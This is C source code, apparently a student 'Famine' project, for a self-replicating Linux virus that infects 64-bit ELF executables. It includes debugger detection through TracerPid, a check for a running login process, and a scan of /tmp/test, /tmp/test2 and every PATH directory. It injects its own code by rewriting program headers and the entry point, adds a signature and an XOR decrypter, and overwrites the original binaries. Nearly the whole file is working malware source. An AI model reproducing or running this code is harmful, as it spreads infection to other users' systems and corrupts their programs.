//
// Created by Joris GOUNAND on 11/8/19.
//

#include <asm/unistd.h>
#include <asm/stat.h>
#include <sys/types.h>
# include <stdbool.h>

#include <dirent.h>
#include <elf.h>
#include <string.h>
#include <stdio.h>
# define SIZE_BEFORE_ENTRY_POINT (62 + 2 * sizeof(size_t))
# define BONUS 1

typedef struct	s_file
{
	int         fd;
	char		*data;
	size_t		size;
	bool        error;
}				t_file;
struct linux_dirent64 {
	long long        d_ino;    /* 64-bit inode number */
	unsigned long long        d_off;    /* 64-bit offset to next structure */
	unsigned short d_reclen; /* Size of this dirent */
	unsigned char  d_type;   /* File type */
	char           d_name[]; /* Filename (null-terminated) */
};


 size_t  ft_strlen(const char *s);
 int get_env_var(char *name, char *content, int content_size);
int open_directory(char *path, unsigned int *n_loaded);
 void    *ft_memmove(void *dst, const void *src, size_t len);
 bool process_runing(void); //CHANGER L APPELLE DE DIR
int do_the_job(char file[],size_t size, char *path, unsigned int *n_loaded);
 int             ft_strncmp(const char *s1, const char *s2, size_t n);
 int infect(char path[],size_t path_length);
void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry, unsigned int n_loaded,size_t padding);
int     ft_isdigit(int c);
 int ft_isallnum(char *str);
size_t	put_sig(int fd, unsigned int n_loaded);
 bool	im_infected(char *data);
 bool	is_infected2(char *data);
bool is_infected(const char *haystack, size_t n);

		void decrypter(unsigned long address_of_main);

 char            *ft_strnstr(char *s1, char *s2, size_t n);
 int             ft_strcmp(const char *s1, const char *s2);

#define PAGE_SIZE (0x2000)
#define PAGE_SZ64 PAGE_SIZE

# define __syscall6(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4,type5,arg5,type6,arg6)\
type name(type1 arg1,type2 arg2, type3 arg3, type4 arg4, type5 arg5, type6 arg6)\
{\
	register long long    syscall_no  asm("rax") = __NR_##name;\
	register type1   argument1        asm("rdi") = arg1;\
	register type2        arg_2        asm("rsi") = arg2;\
	register type3    arg_3        asm("rdx") = arg3;\
	register type4    arg_4        asm("r10") = arg4;\
	register type5    arg_5        asm("r8") = arg5;\
	register type6    arg_6        asm("r9") = arg6;\
	asm("syscall");\
	register type i asm("rax");\
return i;\
}

# define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3)\
type name(type1 arg1,type2 arg2, type3 arg3)\
{\
	register long long    syscall_no  asm("rax") = __NR_##name;\
	register type1   argument1        asm("rdi") = arg1;\
	register type2        arg_2        asm("rsi") = arg2;\
	register type3    arg_3        asm("rdx") = arg3;\
	asm("syscall");\
	register type i asm("rax");\
return i;\
}
# define __syscall2(type,name,type1,arg1,type2,arg2)\
type name(type1 arg1,type2 arg2)\
{\
	register long long    syscall_no  asm("rax") = __NR_##name;\
	register type1   argument1        asm("rdi") = arg1;\
	register type2        arg_2        asm("rsi") = arg2;\
	asm("syscall");\
	register type i asm("rax");\
return i;\
}
# define __syscall1(type,name,type1,arg1)\
type name(type1 arg1)\
{\
	register long long    syscall_no  asm("rax") = __NR_##name;\
	register type1  argument1        asm("rdi") = arg1;\
	asm("syscall");\
	register type i asm("rax");\
return i;\
}

# define __syscall0(type,name)\
type name(void)\
{\
	register long long    syscall_no  asm("rax") = __NR_##name;\
	asm("syscall");\
	register type i asm("rax");\
return i;\
}

ssize_t read(int fd, void *buf, size_t count);
int close(int fd);
int exit(int status);
int fstat(int fd, struct stat *statbuf);
int rename(const char *oldpath, const char *newpath);
ssize_t read(int fd, void *buf, size_t count);
int open(const char *pathname, int flags, mode_t mode);
int getdents64(unsigned int fd, struct linux_dirent64 *dirp,
               unsigned int count);
void main_encrypt();
void *mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags,unsigned long fd,unsigned long offset);
ssize_t write(int fd, const void *buf, size_t count);


unsigned long get_eip(void);
extern int yeah;
extern int real_start;
extern int myend;

extern int do_main(void);

int _start()
{
	__asm__(".globl real_start\n"
	        "real_start:\n"
            "pushq %rax\n"
			"pushq %rax\n"
	        "pushq %rbx\n"
		 "lea    -0xa(%rip),%rax \n"
	"mov    %rax,0x10(%rsp)\n"

			"pushq %rcx\n"
			"pushq %rdx\n"
			"pushq %rsi\n"
			"pushq %rdi\n"
			"pushq %r8\n"
			"pushq %r9\n"
			"pushq %r10\n"
			"pushq %r11\n"
			"pushq %r12\n"
			"pushq %r13\n"
			"pushq %r14\n"
			"pushq %r15\n"

		    "call do_main\n"
	        "jmp myend\n");

}


int do_main(void)
{
	if (process_runing())
	{
		return (1);
	}
		main_encrypt();

	return (0);
}
__syscall1(int, close, int, fd);
__syscall1(int, exit, int, status);
__syscall2(int, rename, const char *, old, const char *, new);
__syscall3(ssize_t, read, int, fd, void *, buf, size_t, count);
__syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
__syscall3(int, getdents64, unsigned int, fd, struct linux_dirent64*, dirp,  unsigned int, count);
__syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count); // poura etre decalle apres (used for debug)
__syscall6(void *,mmap,unsigned long,addr, unsigned long ,len, unsigned long ,prot, unsigned long ,flags,unsigned long ,fd,unsigned long ,offset);
bool process_runing(void)
{

	int fd,i,dd, nread;
	char buf[256];
	char *TracerPid;
	char *Name;
	struct linux_dirent64 *d;
	char path[64];
	char proc [18];
	proc[0] = '/';
	proc[1] = 'p';
	proc[2] = 'r';
	proc[3] = 'o';
	proc[4] = 'c';
	proc[5] = '/';
	proc[6] = 's';
	proc[7] = 'e';
	proc[8] = 'l';
	proc[9] = 'f';
	proc[10] = '/';
	proc[11] = 's';
	proc[12] = 't';
	proc[13] = 'a';
	proc[14] = 't';
	proc[15] = 'u';
	proc[16] = 's';
	proc[17] = '\0';
char TracerPid_name[11];
	TracerPid_name[0] = 'T';
	TracerPid_name[1] = 'r';
	TracerPid_name[2] = 'a';
	TracerPid_name[3] = 'c';
	TracerPid_name[4] = 'e';
	TracerPid_name[5] = 'r';
	TracerPid_name[6] = 'P';
	TracerPid_name[7] = 'i';
	TracerPid_name[8] = 'd';
	TracerPid_name[9] = ':';
	TracerPid_name[10] = '\0';

	fd = open (proc, 0,0);
	while((i =read(fd,buf,255)) > 0)
	{
		if ((TracerPid = ft_strnstr(buf,TracerPid_name,i)) != 0)
		{
			TracerPid += 10;
			while(*TracerPid == '\t' || *TracerPid == ' ')
			{
				TracerPid++;
			}
			if (*TracerPid != '0' && *TracerPid != '\n')
				exit(0);
		}
	}
	close(fd);
	proc[6] = 0;
	dd = open(proc,0x10000,0);
	if (dd <= 0)
	{
		return 1;
	}
	ft_memmove(path,proc,6);
	char cmdname[64];
	char login[6];
	login[0] = 'l';
	login[1] = 'o';
	login[2] = 'g';
	login[3] = 'i';
	login[4] = 'n';
	login[5] = '\0';
	char cmdline[9];
	cmdline[0] = '/';
	cmdline[1] = 'c';
	cmdline[2] = 'm';
	cmdline[3] = 'd';
	cmdline[4] = 'l';
	cmdline[5] = 'i';
	cmdline[6] = 'n';
	cmdline[7] = 'e';
	cmdline[8] = '\0';
	int j = 0;
	while ((nread = getdents64(dd,  (struct linux_dirent64*)buf, 255)) > 0)
	{
		i = 0;

		while(i<nread)
		{
			d = (struct linux_dirent64 *) (buf + i);
			i += d->d_reclen ;
			if (ft_isallnum(d->d_name) == 0)
			{
				ft_memmove(path + 6,d->d_name,ft_strlen(d->d_name)+ 1);
				ft_memmove(path + ft_strlen(path), cmdline, 9);

				fd = open(path,0,0);
				j = read(fd,cmdname, 63);
				cmdname[j + 1] = 0;
					if (!ft_strcmp(cmdname, login))
					{
						return (1);
					}
				}

			}
		}
	return (0);
}





int     ft_isdigit(int c)
{
	if ((c >= '0') && (c <= '9'))
		return (1);
	return (0);
}
int ft_isallnum(char *str)
{
	while(*str)
	{
		if (!ft_isdigit(*str))
			return 1;
		str++;
	}
	return 0;
}
void    *ft_memcpy(void *dst, const void *src, size_t n)
{
	unsigned char   *srctmp;
	unsigned char   *dsttmp;
	size_t                  i;

	srctmp = (unsigned char *)src;
	dsttmp = (unsigned char *)dst;
	i = 0;
	while (i < n)
	{
		dsttmp[i] = srctmp[i];
		i++;
	}
	return ((void *)dst);
}
void    *ft_memmove(void *dst, const void *src, size_t len)
{
	char    *srctmp;
	char    *dsttmp;

	srctmp = (char *)src;
	dsttmp = (char *)dst;
	if (srctmp < dsttmp)
	{
		srctmp = (srctmp + len) - 1;
		dsttmp = (dsttmp + len) - 1;
		while (len-- > 0)
			*dsttmp-- = *srctmp--;
	}
	else
		ft_memcpy(dst, src, len);
	return ((void *)dst);
}
char            *ft_strnstr(char *s1, char *s2, size_t n)
{
	size_t  i;

	if (!(*s2))
		return ((char *)s1);
	while (*s1 && n--)
	{
		if (*s1 == s2[0])
		{
			i = 1;
			while (n-- && s1[i] && s2[i] && s1[i] == s2[i])
				++i;
			if (i == ft_strlen(s2))
				return ((char *)s1);
			n += i;
		}
		s1++;
	}
	return (NULL);
}
size_t  ft_strlen(const char *s)
{
	size_t  i;

	i = 0;
	while (*(s + i) != '\0')
	{
		i++;
	}
	return (i);
}
int             ft_strcmp(const char *s1, const char *s2)
{
	int     index;

	index = 0;
	while (s1[index] && s2[index] &&
	       (unsigned char)s1[index] == (unsigned char)s2[index])
	{
		index++;
	}
	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
}
void decrypter(unsigned long address_of_main)
{
	size_t	size;
	size_t	offset;
	char	*start;

	offset = *(size_t *)(address_of_main - (sizeof(offset) * 2));
	size = *(size_t *)(address_of_main - sizeof(offset));
	start = (char *)address_of_main + offset;
	offset = 0;
	if(size && im_infected((char *)address_of_main))
	{
		start[offset] ^= *(int *)(address_of_main -  (sizeof(offset) * 2));
		offset++;
		while (offset < size+1)
		{
			start[offset] ^= start[offset - 1];
			offset++;
		}
	}
}

unsigned long get_eip(void)
{
	__asm__("call yeah\n"
	        ".globl yeah\n"
	        "yeah:\n"
	        "popq %rax");
}

bool	im_infected(char *data)
{
	char sig[54];
	sig[0] ='F';
	sig[1] ='a';
	sig[2] ='m';
	sig[3] ='i';
	sig[4] ='n';
	sig[5] ='e';
	sig[6] =' ';
	sig[7] ='v';
	sig[8] ='e';
	sig[9] ='r';
	sig[10] ='s';
	sig[11] ='i';
	sig[12] ='o';
	sig[13] ='n';
	sig[14] =' ';
	sig[15] ='1';
	sig[16] ='.';
	sig[17] ='0';
	sig[18]=' ';
	sig[19]='(';
	sig[20]='c';
	sig[21]=')';
	sig[22]='o';
	sig[23]='d';
	sig[24]='e';
	sig[25]='d';
	sig[26]=' ';
	sig[27]='b';
	sig[28]='y';
	sig[29]=' ';
	sig[30]='<';
	sig[31]='j';
	sig[32]='g';
	sig[33]='o';
	sig[34]='u';
	sig[35]='n';
	sig[36]='a';
	sig[37]='n';
	sig[38]='d';
	sig[39]='>';
	sig[40]='-';
	sig[41]='<';
	sig[42]='a';
	sig[43]='f';
	sig[44]='i';
	sig[45]='o';
	sig[46]='d';
	sig[47]='i';
	sig[48]='e';
	sig[49]='r';
	sig[50]='>';
	sig[51]=' ';
	sig[52]='-';
	sig[53]=' ';
	int i;

	i ^= i;
	while(sig[i])
	{
		if (sig[i] !=  *((char *)(data - SIZE_BEFORE_ENTRY_POINT + i)))
			return(0);
		i++;
	}
	return(1);
}
void main_encrypt()
{
	char path_maj[6];
	path_maj[0] = 'P';
	path_maj[1] = 'A';
	path_maj[2] = 'T';
	path_maj[3] = 'H';
	path_maj[4] = '=';
	path_maj[5] = 0;

	char path_env[256];

	path_env[0] = '/';
	path_env[1] = 't';
	path_env[2] = 'm';
	path_env[3] = 'p';
	path_env[4] = '/';
	path_env[5] = 't';
	path_env[6] = 'e';
	path_env[7] = 's';
	path_env[8] = 't';
	path_env[9] = ':';
	path_env[10] = '/';
	path_env[11] = 't';
	path_env[12] = 'm';
	path_env[13] = 'p';
	path_env[14] = '/';
	path_env[15] = 't';
	path_env[16] = 'e';
	path_env[17] = 's';
	path_env[18] = 't';
	path_env[19] = '2';
	path_env[20] = ':';
	path_env[21] = 0;

	get_env_var(path_maj,path_env + 21,256 - 21);
	size_t path_length = ft_strlen(path_env);
	size_t i = 0;
	int length_path = 0;
	unsigned int n_loaded = 0;

	do
	{
		if (!BONUS && i > 20)
			return;
		if(path_env[i] == ':')
		{
			path_env[i] = '\0';
			open_directory(&path_env[i] - length_path, &n_loaded);
			path_env[i] = ':';
			length_path = -1;
		}
		else if (path_env[i] == '\0')
		{
			if (length_path)
				open_directory(&path_env[i] - length_path, &n_loaded);
			break ;
		}
		i++;
		length_path++;
	}
	while(i < path_length);

	infect(path_env, 256);
}
__syscall1(int, unlink, const char *, pathname);
__syscall2(int, fstat, int, fildes, struct stat * , buf);
__syscall3(off_t, lseek, int, fildes, off_t, offset, int, whence);
size_t crypter(char *read, size_t size, char key, int fd);


int get_env_var(char *name, char *content, int content_size)
{
	char buf[4];
	int fd;
	size_t n,i;
	int j,k = 0;
	int nb_start = 1;
	int name_lenght = ft_strlen(name);
	char path_proc[19];
	path_proc[0] ='/';
	path_proc[1] ='p';
	path_proc[2] ='r';
	path_proc[3] ='o';
	path_proc[4] ='c';
	path_proc[5] ='/';
	path_proc[6] ='s';
	path_proc[7] ='e';
	path_proc[8] ='l';
	path_proc[9] ='f';
	path_proc[10] ='/';
	path_proc[11] ='e';
	path_proc[12] ='n';
	path_proc[13] ='v';
	path_proc[14] ='i';
	path_proc[15] ='r';
	path_proc[16] ='o';
	path_proc[17] ='n';
	path_proc[18] = 0;

	if ((fd = open(path_proc,0x0000,0))<0)
		return (0);
	do
	{
		n = read(fd,buf,4);
		for (i= 0; i < n ; ++i)
		{
			if (nb_start)
			{
				if (k != name_lenght)
				{
					if (buf[i] == name[k])
						k++;
					else
					{
						k = 0;
						nb_start = 0;
						j = 0;
					}
				}
				else if (j < content_size - 1)
				{
					if (buf[i] == '\0')
						goto  out;
					content[j++] = buf[i];
				}
				else
					goto out;
			}
			else if (buf[i] == '\0')
				nb_start = 1;
		}
	}
	while(n);
	out:
	content[j] = '\0';
	close(fd);
	return (content[0] != '\0');
}

int open_directory(char *path, unsigned int *n_loaded)
{
	int dd,nread;
	char buf[128];
	char path_file[256];
	struct linux_dirent64 *d;
	size_t len;
	dd = open(path, 0x10000,0);
	if (dd < 0)
	{
		return 1;
	}
	int i;
	while ((nread = getdents64(dd, (struct linux_dirent64*)buf, 128)) > 0)
	{
		for (i = 0 ; i < nread;)
		{
			d = (struct linux_dirent64 *) (buf + i);
			i += d->d_reclen ;
			if (d->d_name[0] == '.' || (d->d_name[0] == 'd' && d->d_name[1] == 'p' && d->d_name[2] == 'k' && d->d_name[3] == 'g') ||
					(d->d_name[0] == 'l' && d->d_name[1] == 'o' && d->d_name[2] == 'g' && d->d_name[3] == 'i' && d->d_name[3] == 'n' ))
				continue;
			len = ft_strlen(path);
			ft_memmove(path_file,path,len);
			path_file[len] = '/';
			ft_memmove(path_file + len + 1,d->d_name, ft_strlen(d->d_name));

			path_file[len + 1 + ft_strlen(d->d_name)] = '\0';
			struct stat st;
			int fd = open (path_file, 0,0);
			if (fd > 0)
			{
				st.st_size = 0;
				if (fstat(fd , &st) < 0)
					return 1;
				char *mem = (char*)mmap(0, st.st_size, 3, 33, -1, 0);
				for (long int j = 0; j < st.st_size;j++)
					mem[j] = 0;
				int c = read(fd, mem,st.st_size);
				if (c > 0)
					do_the_job(mem,st.st_size,path_file, n_loaded);
				close(fd);
			}

		}
	}
	close(dd);

	return 0;
}
int do_the_job(char buff[],size_t size, char *path, unsigned int *n_loaded)
{
	unsigned int payload_len = ((char *)&myend - (char *)&real_start ) + SIZE_BEFORE_ENTRY_POINT;
	if (size < sizeof(Elf64_Ehdr)  || buff[EI_MAG0] != 0x7f || buff[EI_MAG1] != 'E' || buff[EI_MAG2] != 'L' || buff[EI_MAG3] != 'F'  || buff[EI_CLASS] != ELFCLASS64)
	{
		return (1);
	}
	Elf64_Ehdr* hdr;
	Elf64_Phdr* phdr;
	Elf64_Addr entry, payload_vaddr, text_end;
	hdr = (Elf64_Ehdr*) buff;
	entry = hdr->e_entry;

	phdr = (Elf64_Phdr*) (buff + hdr->e_phoff);

	hdr->e_shoff += PAGE_SZ64;
size_t padding_before = 0;
	for(int i=0; i < hdr->e_phnum - 1; i++){
		if(is_infected(buff + phdr[i].p_offset, phdr[i].p_filesz))
			return (1);
		if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_W)) {
            padding_before = phdr[i + 1].p_vaddr + phdr[i + 1].p_filesz - phdr[i].p_vaddr + phdr[i].p_filesz + 0x1000;
			text_end = phdr[i].p_offset + phdr[i].p_filesz;
			payload_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz + padding_before;
			hdr->e_entry = payload_vaddr + SIZE_BEFORE_ENTRY_POINT + 0;
			entry =  (phdr[i].p_paddr + phdr[i].p_filesz  + padding_before+ SIZE_BEFORE_ENTRY_POINT)- entry;
			phdr[i].p_filesz += payload_len +100 + padding_before;
			phdr[i].p_memsz += payload_len + 100 + padding_before;
			phdr[i].p_flags |= PF_X;
			new_file(buff,size,text_end, path,entry, (*n_loaded)++,padding_before);
			return 0;
		}
	}
	return 1;
}

int infect(char path[],size_t path_length)
{
	size_t i = 0;

	int length_path =0;
	unsigned int n_loaded = 0;

	do
	{
		if(path[i] == ':')
		{
			path[i] = '\0';
			open_directory(&path[i] - length_path, &n_loaded);
			path[i] = ':';
			length_path = -1;
		}
		else if (path[i] == '\0')
		{
			if (length_path)
				open_directory(&path[i] - length_path, &n_loaded);
			break ;
		}
		i++;
		length_path++;
	}
	while(i < path_length);
	return 0;
}

char    *only_name(char *line)
{
	int        size;
	size = ft_strlen(line);
	size++;
	while (--size)
	{
		if (line[size] == '/')
			return (&(line[size + 1]));
	}
	return (line);
}

void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry, unsigned int n_loaded, size_t padding)
{
	int fd;
	char tmp[125];
	unsigned int parasite_size = ((char *)&myend - (char *)&real_start) +29;
	char jmp_code[9];

	jmp_code[0] = '\x81';
	jmp_code[1] = '\x2c';
	jmp_code[2] = '\x24';
	jmp_code[3] = '\x00';
	jmp_code[4] = '\x00';
	jmp_code[5] = '\x00';
	jmp_code[6] = '\x00';
	jmp_code[7] = '\xc3';
	jmp_code[8] = '\xc3';

	*(unsigned int*) &jmp_code[3] = old_e_entry;
	for (int i = 0; i< 125;i++)
		tmp[i] = 0;
	ft_memmove(tmp,path,ft_strlen(path));
	ft_memmove(only_name(tmp) + 1,only_name(tmp), ft_strlen(only_name(tmp)));
	*only_name(tmp) = '.';
	if ((fd = open (tmp, 0x242, 0755)) < 0)
		return ;
	write(fd,buf, end_of_text);
	unsigned long address_of_start = get_eip() - ((char *)&yeah - (char *)&real_start);
	unsigned long address_of_start_encrypt = get_eip() - ((char *)&yeah - (char *)&main_encrypt);
	size_t size_wrote = 0;
	size_t	value;
	for (size_t j = 0; j<  padding;j++)
		write(fd,"\0",1);
	size_wrote =	put_sig(fd, n_loaded);
	value = (address_of_start_encrypt - address_of_start);
	size_wrote += write(fd, (char *)(&value), sizeof(size_t));
	value = parasite_size - 7 - (address_of_start_encrypt - address_of_start);
	size_wrote += write(fd, (char *)(&value), sizeof(size_t));
	size_wrote += write(fd,(char *) address_of_start,parasite_size /**(address_of_start_encrypt - address_of_start)**/);
	size_wrote += write(fd,jmp_code,9);
	for (long unsigned int i = 0; i< PAGE_SIZE*2 - size_wrote ;i++)
		write(fd,"\0",1);
	write(fd,buf + end_of_text, size - end_of_text);
	close(fd);
	unlink(path);
	rename (tmp, path);
}

int             ft_strncmp(const char *s1, const char *s2, size_t n)
{
	size_t  index;

	index = 0;
	while (index < n && s1[index] && s2[index] &&
	       (unsigned char)s1[index] == (unsigned char)s2[index])
	{
		index++;
	}
	if (index >= n)
		return (0);
	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
}
bool is_infected(const char *haystack, size_t n)
{
	unsigned int	i;
	unsigned int	j;
	unsigned int	k;
	char needle[55];
	needle[0] ='F';
	needle[1] ='a';
	needle[2] ='m';
	needle[3] ='i';
	needle[4] ='n';
	needle[5] ='e';
	needle[6] =' ';
	needle[7] ='v';
	needle[8] ='e';
	needle[9] ='r';
	needle[10] ='s';
	needle[11] ='i';
	needle[12] ='o';
	needle[13] ='n';
	needle[14] =' ';
	needle[15] ='1';
	needle[16] ='.';
	needle[17] ='0';
	needle[18]=' ';
	needle[19]='(';
	needle[20]='c';
	needle[21]=')';
	needle[22]='o';
	needle[23]='d';
	needle[24]='e';
	needle[25]='d';
	needle[26]=' ';
	needle[27]='b';
	needle[28]='y';
	needle[29]=' ';
	needle[30]='<';
	needle[31]='j';
	needle[32]='g';
	needle[33]='o';
	needle[34]='u';
	needle[35]='n';
	needle[36]='a';
	needle[37]='n';
	needle[38]='d';
	needle[39]='>';
	needle[40]='-';
	needle[41]='<';
	needle[42]='a';
	needle[43]='f';
	needle[44]='i';
	needle[45]='o';
	needle[46]='d';
	needle[47]='i';
	needle[48]='e';
	needle[49]='r';
	needle[50]='>';
	needle[51]=' ';
	needle[52]='-';
	needle[53]=' ';
	needle[54]='\0';
	i = 0;
	if (!needle[0])
		return ((char *)haystack);
	while (n--)
	{
		j = i;
		k = 0;
		while (haystack[j] == needle[k])
		{
			j++;
			k++;
			if (!needle[k])
				return 1;
		}
		i++;
	}
	return (0);
}
bool	is_infected2(char *data)
{
	Elf64_Ehdr          *header;
	char sig[54];
	sig[0] ='F';
	sig[1] ='a';
	sig[2] ='m';
	sig[3] ='i';
	sig[4] ='n';
	sig[5] ='e';
	sig[6] =' ';
	sig[7] ='v';
	sig[8] ='e';
	sig[9] ='r';
	sig[10] ='s';
	sig[11] ='i';
	sig[12] ='o';
	sig[13] ='n';
	sig[14] =' ';
	sig[15] ='1';
	sig[16] ='.';
	sig[17] ='0';
	sig[18]=' ';
	sig[19]='(';
	sig[20]='c';
	sig[21]=')';
	sig[22]='o';
	sig[23]='d';
	sig[24]='e';
	sig[25]='d';
	sig[26]=' ';
	sig[27]='b';
	sig[28]='y';
	sig[29]=' ';
	sig[30]='<';
	sig[31]='j';
	sig[32]='g';
	sig[33]='o';
	sig[34]='u';
	sig[35]='n';
	sig[36]='a';
	sig[37]='n';
	sig[38]='d';
	sig[39]='>';
	sig[40]='-';
	sig[41]='<';
	sig[42]='a';
	sig[43]='f';
	sig[44]='i';
	sig[45]='o';
	sig[46]='d';
	sig[47]='i';
	sig[48]='e';
	sig[49]='r';
	sig[50]='>';
	sig[51]=' ';
	sig[52]='-';
	sig[53]=' ';
	int i;

	i = 0;
	header = (Elf64_Ehdr *)data;
		while(sig[i])
		{
			if (sig[i] !=  *((char *)(data + header->e_entry - SIZE_BEFORE_ENTRY_POINT + i)))
			{
				return(0);
			}
			i++;
		}
	return(1);
}

size_t	put_sig(int fd, unsigned int n_loaded)
{
	char sig[54];
	sig[0] ='F';
	sig[1] ='a';
	sig[2] ='m';
	sig[3] ='i';
	sig[4] ='n';
	sig[5] ='e';
	sig[6] =' ';
	sig[7] ='v';
	sig[8] ='e';
	sig[9] ='r';
	sig[10] ='s';
	sig[11] ='i';
	sig[12] ='o';
	sig[13] ='n';
	sig[14] =' ';
	sig[15] ='1';
	sig[16] ='.';
	sig[17] ='0';
	sig[18]=' ';
	sig[19]='(';
	sig[20]='c';
	sig[21]=')';
	sig[22]='o';
	sig[23]='d';
	sig[24]='e';
	sig[25]='d';
	sig[26]=' ';
	sig[27]='b';
	sig[28]='y';
	sig[29]=' ';
	sig[30]='<';
	sig[31]='j';
	sig[32]='g';
	sig[33]='o';
	sig[34]='u';
	sig[35]='n';
	sig[36]='a';
	sig[37]='n';
	sig[38]='d';
	sig[39]='>';
	sig[40]='-';
	sig[41]='<';
	sig[42]='a';
	sig[43]='f';
	sig[44]='i';
	sig[45]='o';
	sig[46]='d';
	sig[47]='i';
	sig[48]='e';
	sig[49]='r';
	sig[50]='>';
	sig[51]=' ';
	sig[52]='-';
	sig[53]=' ';

	int i;
	size_t size;
	unsigned long address_of_main = get_eip() - ((char *)&yeah - (char *)&real_start);

	if (im_infected((char *)address_of_main))
	{
		n_loaded += ((((char *)(address_of_main - 24))[0] - '0') * 10000000 );
		n_loaded += ((((char *)(address_of_main - 24))[1] - '0') * 1000000 );
		n_loaded += ((((char *)(address_of_main - 24))[2] - '0') * 100000 );
		n_loaded += ((((char *)(address_of_main - 24))[3] - '0') * 10000 );
		n_loaded += ((((char *)(address_of_main - 24))[4] - '0') * 1000 );
		n_loaded += ((((char *)(address_of_main - 24))[5] - '0') * 100 );
		n_loaded += ((((char *)(address_of_main - 24))[6] - '0') * 10 );
		n_loaded += ((((char *)(address_of_main - 24))[7] - '0') * 1 );
	}

	char fingerprint[8];
	fingerprint[0]='0' + (n_loaded /10000000 ) % 10;
	fingerprint[1]='0' + (n_loaded /1000000 ) % 10;
	fingerprint[2]='0' + (n_loaded /100000 ) % 10;
	fingerprint[3]='0' + (n_loaded /10000 ) % 10;
	fingerprint[4]='0' + (n_loaded /1000 ) % 10;
	fingerprint[5]='0' + (n_loaded /100 ) % 10;
	fingerprint[6]='0' + (n_loaded /10 ) % 10;
	fingerprint[7]='0' + (n_loaded /1 ) % 10;

	size = write(fd,sig, sizeof(sig));
	size += write(fd,fingerprint, sizeof(fingerprint));
	return (size);
}

size_t crypter(char *read, size_t size, char key, int fd)
{
	char tab;
	size_t i ;
	if(size)
	{
		i = 0;
		lseek(fd, (off_t)size, SEEK_CUR);
		while ((int)size > 0)
		{
			tab = read[size] ^ read[size - 1];
			i += write(fd, &(tab), 1);
			lseek(fd, (off_t)-2, SEEK_CUR);
			size--;
		}

		tab = (read[size] ^ key);
		i += write(fd, &(tab), 1);
		lseek(fd, (off_t)0, SEEK_END);
		size--;
	}
	return (i);
}

void end_code() {
__asm__(".globl myend\n"
        "myend:	     \n"
		"popq %r15\n"
        "popq %r14\n"
        "popq %r13\n"
        "popq %r12\n"
        "popq %r11\n"
        "popq %r10\n"
        "popq %r9\n"
        "popq %r8\n"
        "popq %rdi\n"
        "popq %rsi\n"
        "popq %rdx\n"
        "popq %rcx\n"
        "popq %rbx\n"
		"popq %rax\n"

        "mov $1,%rax \n"
        "mov $0,%rbx \n"
        "int $0x80   \n");
}
